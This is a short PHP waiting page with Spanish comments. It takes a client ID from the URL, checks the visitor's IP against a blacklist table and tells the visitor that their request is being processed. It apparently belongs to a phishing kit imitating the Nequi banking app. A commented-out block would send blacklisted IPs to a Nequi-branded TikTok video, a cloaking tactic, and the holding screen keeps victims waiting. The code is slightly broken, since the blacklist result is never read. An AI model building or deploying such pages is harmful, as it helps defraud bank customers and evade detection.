<?php
session_start();
include 'config/conexion.php';

// Obtener la IP del cliente (Soporte para Render/Proxies)
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip_cliente = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
} else {
    $ip_cliente = $_SERVER['REMOTE_ADDR'];
}

// Verificar si la IP está en la lista negra
$sql = "SELECT COUNT(*) as count FROM blacklist WHERE ip_address = ?";
$stmt = $conn->prepare($sql);
$stmt->bind_param("s", $ip_cliente);
$stmt->execute();
$result = $stmt->get_result();
// if ($row['count'] > 0) {
//     // Si la IP está en la lista negra, redirigir a box.com
//     header("Location: https://www.tiktok.com/@appnequi_/video/7424178986713926917?is_from_webapp=1&sender_device=pc&web_id=7426314577082500613");
//     exit();
// }

// Verificar si se ha pasado un ID por la URL
if (isset($_GET['id'])) {
    $cliente_id = $_GET['id'];
} else {
    // Manejar el caso donde no se pasa un ID
    header("Location: error.php"); // Redirigir a una página de error o algo similar
    exit();
}

// Cerrar la conexión a la base de datos si no se necesita
$conn->close();
?>


<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Página de Espera</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> <!-- Asegúrate de incluir jQuery -->
    <script type="text/javascript">
        const clienteId = <?php echo json_encode($cliente_id); ?>; // Obtener el ID del cliente de PHP
    </script>
    <script type="text/javascript" src="config/js/scripts.js"></script> <!-- Cargar el script separado -->
    <link rel="stylesheet" href="config/css/espera.css">
</head>

<body>
    <div>
        <center><img src="config/img/giphy.webp" alt="" class="gif"></center>
        <p>Su solicitud esta siendo procesada</p>
        <p>esto puede tardar de 1 a 5 minutos.</p>
    </div>
</body>

</html>